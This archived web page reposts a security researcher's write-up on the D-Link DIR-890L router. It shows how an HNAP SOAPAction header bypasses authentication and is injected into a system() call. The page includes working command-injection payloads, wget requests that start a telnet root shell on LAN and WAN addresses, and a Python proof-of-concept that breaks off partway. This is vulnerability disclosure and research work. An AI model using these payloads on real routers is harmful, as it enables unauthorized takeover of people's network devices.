<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We crack D-Link DIR-890L</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The last 6 months, I was terribly busy and did not follow the new crap from D-Link. To have a little fun, I went to their website, and I was greeted b...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We crack D-Link DIR-890L</h1><div class="post__text post__text-html js-mediator-article">  The last 6 months, I was terribly busy and did not follow the new crap from D-Link.  To have a little fun, I went to their website, and I was greeted by this nightmare: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fd0/d34/2e2/fd0d342e20917f5e6f2fd77125aa4a93.png" alt="Insane router"><br>  <i>The craziest router D-Link DIR-890L for $ 300</i> <br><br>  Perhaps the most "insane" in the router is that it has been running all the same <a href="httpcookie">buggy</a> <a href="http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html">firmware</a> that D-Link has been putting into its routers for several years ... <a href="https://www.youtube.com/watch%3Fv%3DWQZqJ_-WAO8">and the hits just keep on coming.</a> <br><a name="habracut"></a><br>  Well, let's do as usual - take the <a href="">latest firmware version</a> , go through it <a href="https://github.com/devttys0/binwalk">binwalk</a> and see what we got: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="hljs matlab">DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0x0</span></span> DLOB firmware header, boot partition: <span class="hljs-string"><span class="hljs-string">"dev=/dev/mtdblock/7"</span></span> <span class="hljs-number"><span class="hljs-number">116</span></span> <span class="hljs-number"><span class="hljs-number">0x74</span></span> LZMA compressed data, <span class="hljs-keyword"><span class="hljs-keyword">properties</span></span>: <span class="hljs-number"><span class="hljs-number">0x5D</span></span>, dictionary <span class="hljs-built_in"><span class="hljs-built_in">size</span></span>: <span class="hljs-number"><span class="hljs-number">33554432</span></span> bytes, uncompressed <span class="hljs-built_in"><span class="hljs-built_in">size</span></span>: <span class="hljs-number"><span class="hljs-number">4905376</span></span> bytes <span class="hljs-number"><span class="hljs-number">1835124</span></span> <span class="hljs-number"><span class="hljs-number">0x1C0074</span></span> PackImg section delimiter tag, little endian <span class="hljs-built_in"><span class="hljs-built_in">size</span></span>: <span class="hljs-number"><span class="hljs-number">6345472</span></span> bytes; big endian <span class="hljs-built_in"><span class="hljs-built_in">size</span></span>: <span class="hljs-number"><span class="hljs-number">13852672</span></span> bytes <span class="hljs-number"><span class="hljs-number">1835156</span></span> <span class="hljs-number"><span class="hljs-number">0x1C0094</span></span> Squashfs filesystem, little endian, version <span class="hljs-number"><span class="hljs-number">4.0</span></span>, compress</code> </pre> <br>  It looks like a regular Linux firmware, and if you‚Äôve looked into any D-Link firmware for the past few years, you can easily recall the directory structure: <br><br><pre> <code class="hljs mel">$ <span class="hljs-keyword"><span class="hljs-keyword">ls</span></span> squashfs-root bin dev etc home htdocs include lib mnt mydlink <span class="hljs-keyword"><span class="hljs-keyword">proc</span></span> sbin sys tmp usr var www</code> </pre> <br>  Everything related to HTTP, UPnP and HNAP is located in the htdocs directory.  The most interesting file here is htdocs / cgibin - ELF-binary for ARM, which is executed by the webserver for, hmm, almost everything: all symlinks to CGI, UPnP and HNAP links lead to this file: <br><br><pre> <code class="hljs ruby">$ ls -l htdocs/web/*.cgi lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/captcha.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/conntrack.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/dlapn.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/dlcfg.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/dldongle.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/fwup.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/fwupload.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/hedwig.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/pigwidgeon.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/seama.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/service.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/webfa_authentication.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span> lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> eve eve <span class="hljs-number"><span class="hljs-number">14</span></span> Mar <span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">46</span></span> htdocs/web/webfa_authentication_logout.cgi -&gt; <span class="hljs-regexp"><span class="hljs-regexp">/htdocs/cgibin</span></span></code> </pre> <br>  He, of course, stripped, but in it there are many lines that will help us.  First of all, <code>main</code> compares <code>argv[0]</code> with a list of symlink names known to it ( <code>captcha.cgi</code> , <code>conntrack.cgi</code> , etc.) to determine what action to perform: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9a8/095/8f2/9a80958f245ce20d66a4bcf8b2812209.png" alt="staircase"><br>  <i>Call graph, typical if / else cascade</i> <br><br>  Each comparison is made by calling strcmp on the well-known names of the symlinks: <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/a82/23f/ea5/a8223fea53fa45784451caa8690d5966.png" alt="image"></a> <br>  <i>Different functions of handlers of different symlinks</i> <br><br>  To simplify the comparison of handler functions and symlinks, rename them according to the symlink name: <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/344/9e3/6a6/3449e36a60c1d4bdf89191b5dc6ec318.png" alt="image"></a> <br>  <i>Renamed handler functions</i> <br><br>  Now that we have the names of the functions, let's start looking for bugs.  Other devices from D-Link, running exactly the same firmware, were previously cracked through <a href="http://www.s3cur1ty.de/node/703">HTTP</a> and <a href="http://www.s3cur1ty.de/node/714">UPnP</a> interfaces, however, no one really looked at the HNAP interface, which is processed by the <code>hnap_main</code> function in <code>cgibin</code> . <br><br>  <a href="http://www.google.com/patents/US7827252">HNAP</a> (Home Network Administration Protocol) is a SOAP-based protocol similar to UPnP, which is usually used by the utility for initial configuration of D-Link EZ routers.  Unlike UPnP, all HNAP actions, except <code>GetDeviceInfo</code> (which is useless), require HTTP Basic authentication. <br><br><pre> <code class="hljs xml">POST /HNAP1 HTTP/1.1 Host: 192.168.0.1 Authorization: Basic YWMEHZY+ Content-Type: text/xml; charset=utf-8 Content-Length: length SOAPAction: "http://purenetworks.com/HNAP1/AddPortMapping" <span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:soap</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AddPortMapping</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://purenetworks.com/HNAP1/"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PortMappingDescription</span></span></span><span class="hljs-tag">&gt;</span></span>foobar<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PortMappingDescription</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">InternalClient</span></span></span><span class="hljs-tag">&gt;</span></span>192.168.0.100<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">InternalClient</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PortMappingProtocol</span></span></span><span class="hljs-tag">&gt;</span></span>TCP<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PortMappingProtocol</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ExternalPort</span></span></span><span class="hljs-tag">&gt;</span></span>1234<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ExternalPort</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">InternalPort</span></span></span><span class="hljs-tag">&gt;</span></span>1234<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">InternalPort</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AddPortMapping</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  The <code>SOAPAction</code> header is very important in an HNAP request, because  it is he who sets what action the server will perform (the <code>AddPortMapping</code> action in the example above). <br><br>  Due to the fact that <code>cgibin</code> launched as a CGI application by the web server, <code>hnap_main</code> receives the data of the HNAP request, for example, the <code>SOAPAction</code> header, via environment variables: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/1f5/fa5/9bd/1f5fa59bd2796b9934a4db825878c3a0.png" alt="image"><br>  <i>SOAPAction = getenv (‚ÄúHTTP_SOAPACTION‚Äù);</i> <br><br>  Toward the end of <code>hnap_main</code> , a shell command is generated by calling <code>sprintf</code> , which is then executed through the <code>system</code> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fb5/c52/709/fb5c52709a4c51934e85403d0707c1ae.png" alt="image"><br>  <i>sprintf (command, ‚Äúsh% s% s.sh&gt; / dev / console‚Äù, ‚Äú/ var / run /‚Äù, SOAPAction);</i> <br><br>  Obviously, <code>hnap_main</code> uses data from the <code>SOAPAction</code> header within the <code>system</code> command!  This bug gives hope, especially if the <code>SOAPAction</code> header is not escaped, and if we can get to this place without authentication. <br><br>  At the beginning of <code>hnap_main</code> , it is checked whether the <code>SOAPAction</code> header is equal to the string <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code>  <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code> , and if it is equal, authentication is skipped.  This is expected, we have already noticed earlier that <code>GetDeviceSettings</code> does not require authentication: <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/c1d/69c/9c2/c1d69c9c22d351a6366f7b3c9534a937.png" alt="image"></a> <br>  <i>if (strstr (SOAPAction, ‚Äúhttp://purenetworks.com/HNAP1/GetDeviceSettings‚Äù)! = NULL)</i> <br><br>  Note, however, that the <code>strstr</code> function is used for checking, which only checks for the presence of the string <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code>  <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code> in the <code>SOAPAction</code> header, not equality to it. <br>  So, if the <code>SOAPAction</code> header contains a substring <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code>  <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code> , the function retrieves the name of the action (i.e. <code>GetDeviceSettings</code> ) from the header and removes double quotes: <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/d9f/a32/5d3/d9fa325d397e7154ef0d2e723b23348c.png" alt="image"></a> <br>  <i>SOAPAction = strrchr (SOAPAction, '/');</i> <br><br>  The name of the action ( <code>GetDeviceSettings</code> ) is <code>GetDeviceSettings</code> from the header, then it goes to the <code>system</code> , passing <code>sprintf</code> . <br>  Here is a C code that demonstrates an error in logic: <br><br><pre> <code class="hljs cpp"><span class="hljs-comment"><span class="hljs-comment">/* Grab a pointer to the SOAPAction header */</span></span> SOAPAction = getenv(<span class="hljs-string"><span class="hljs-string">"HTTP_SOAPACTION"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* Skip authentication if the SOAPAction header contains "http://purenetworks.com/HNAP1/GetDeviceSettings" */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(SOAPAction, <span class="hljs-string"><span class="hljs-string">"http://purenetworks.com/HNAP1/GetDeviceSettings"</span></span>) == <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>) { <span class="hljs-comment"><span class="hljs-comment">/* do auth check */</span></span> } <span class="hljs-comment"><span class="hljs-comment">/* Do a reverse search for the last forward slash in the SOAPAction header */</span></span> SOAPAction = <span class="hljs-built_in"><span class="hljs-built_in">strrchr</span></span>(SOAPAction, <span class="hljs-string"><span class="hljs-string">'/'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(SOAPAction != <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>) { <span class="hljs-comment"><span class="hljs-comment">/* Point the SOAPAction pointer one byte beyond the last forward slash */</span></span> SOAPAction += <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* Get rid of any trailing double quotes */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(SOAPAction[<span class="hljs-built_in"><span class="hljs-built_in">strlen</span></span>(SOAPAction)<span class="hljs-number"><span class="hljs-number">-1</span></span>] == <span class="hljs-string"><span class="hljs-string">'"'</span></span>) { SOAPAction[<span class="hljs-built_in"><span class="hljs-built_in">strlen</span></span>(SOAPAction)<span class="hljs-number"><span class="hljs-number">-1</span></span>] = <span class="hljs-string"><span class="hljs-string">'\0'</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">goto</span></span> failure_condition; } <span class="hljs-comment"><span class="hljs-comment">/* Build the command using the specified SOAPAction string and execute it */</span></span> <span class="hljs-built_in"><span class="hljs-built_in">sprintf</span></span>(command, <span class="hljs-string"><span class="hljs-string">"sh %s%s.sh &gt; /dev/console"</span></span>, <span class="hljs-string"><span class="hljs-string">"/var/run/"</span></span>, SOAPAction); system(command);</code> </pre> <br>  So, what we have learned from this: <br><ul><li>  There is no authentication check if there is a substring in the <code>SOAPAction</code> header <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code> </li> <li>  In <code>sprintf</code> (and <code>system</code> ) everything that is after the last slash in the <code>SOAPAction</code> header is <code>SOAPAction</code> </li></ul><br>  We can easily form a <code>SOAPAction</code> header that will satisfy the authentication bypass and allow us to pass our string to the <code>system</code> : <br><pre> <code class="hljs objectivec">SOAPAction: <span class="hljs-string"><span class="hljs-string">"http://purenetworks.com/HNAP1/GetDeviceSettings/`reboot`"</span></span></code> </pre> <br> <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code>  <code><a href="http://purenetworks.com/HNAP1/GetDeviceSettings"></a> purenetworks.com/HNAP1/GetDeviceSettings</code> in the header allows us to bypass authentication, and the string <code>`reboot`</code> will be passed to the <code>system</code> <br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">system</span></span>("sh /var/run/`reboot`.sh &gt; /dev/console");</code> </pre> <br>  Replacing the <code>reboot</code> with <code>telnetd</code> we will start the telnet server without authentication: <br><pre> <code class="hljs ruby">$ wget --header=<span class="hljs-string"><span class="hljs-string">'SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`telnetd`"'</span></span> <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/192.168.0.1/</span></span>HNAP1 $ telnet <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> Trying <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span>... Connected to <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span>. Escape character is <span class="hljs-string"><span class="hljs-string">'^]'</span></span>. BusyBox v1.<span class="hljs-number"><span class="hljs-number">14.1</span></span> (<span class="hljs-number"><span class="hljs-number">2015</span></span>-<span class="hljs-number"><span class="hljs-number">02</span></span>-<span class="hljs-number"><span class="hljs-number">11</span></span> <span class="hljs-number"><span class="hljs-number">17</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">15</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">51</span></span> CST) built-<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> shell (msh) Enter <span class="hljs-string"><span class="hljs-string">'help'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> a list of built-<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> commands. <span class="hljs-comment"><span class="hljs-comment">#</span></span></code> </pre> <br>  We can send HNAP requests from the WAN if remote administration has been enabled.  Of course, the firewall blocks all incoming connections to telnet from the WAN.  The simplest solution is to kill the HTTP server and run telnetd on its port: <br><pre> <code class="hljs ruby">$ wget --header=<span class="hljs-string"><span class="hljs-string">'SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`killall httpd; telnetd -p 8080`"'</span></span> <span class="hljs-symbol"><span class="hljs-symbol">http:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/1.2.3.4:8080/</span></span>HNAP1 $ telnet <span class="hljs-number"><span class="hljs-number">1.2</span></span>.<span class="hljs-number"><span class="hljs-number">3.4</span></span> <span class="hljs-number"><span class="hljs-number">8080</span></span> Trying <span class="hljs-number"><span class="hljs-number">1.2</span></span>.<span class="hljs-number"><span class="hljs-number">3.4</span></span>... Connected to <span class="hljs-number"><span class="hljs-number">1.2</span></span>.<span class="hljs-number"><span class="hljs-number">3.4</span></span>. Escape character is <span class="hljs-string"><span class="hljs-string">'^]'</span></span>. BusyBox v1.<span class="hljs-number"><span class="hljs-number">14.1</span></span> (<span class="hljs-number"><span class="hljs-number">2015</span></span>-<span class="hljs-number"><span class="hljs-number">02</span></span>-<span class="hljs-number"><span class="hljs-number">11</span></span> <span class="hljs-number"><span class="hljs-number">17</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">15</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">51</span></span> CST) built-<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> shell (msh) Enter <span class="hljs-string"><span class="hljs-string">'help'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> a list of built-<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> commands. <span class="hljs-comment"><span class="hljs-comment">#</span></span></code> </pre> <br>  I will note that wget will hang waiting for an answer, since  <code>cgibin</code> will wait for telnetd to complete.  Here is a little Python PoC that makes everything a bit more comfortable: <br><pre> <code class="hljs pgsql">#!/usr/bin/env python <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib2 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> httplib try: ip_port = sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>].split(<span class="hljs-string"><span class="hljs-string">':'</span></span>) ip = ip_port[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(ip_port) == <span class="hljs-number"><span class="hljs-number">2</span></span>: port = ip_port[<span class="hljs-number"><span class="hljs-number">1</span></span>] elif len(ip_port) == <span class="hljs-number"><span class="hljs-number">1</span></span>: port = "80" <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">raise</span></span> IndexError <span class="hljs-keyword"><span class="hljs-keyword">except</span></span> IndexError: print "Usage: %s &lt;target ip:port&gt;" % sys.argv[<span class="hljs-number"><span class="hljs-number">0</span></span>] sys.<span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>) url = "http://%s:%s/HNAP1" % (ip, port) # NOTE: <span class="hljs-keyword"><span class="hljs-keyword">If</span></span> exploiting <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> the LAN, telnetd can be started <span class="hljs-keyword"><span class="hljs-keyword">on</span></span> # <span class="hljs-keyword"><span class="hljs-keyword">any</span></span> port; killing the http <span class="hljs-keyword"><span class="hljs-keyword">server</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> re-<span class="hljs-keyword"><span class="hljs-keyword">using</span></span> its port # <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> necessary. # # Killing <span class="hljs-keyword"><span class="hljs-keyword">off</span></span> <span class="hljs-keyword"><span 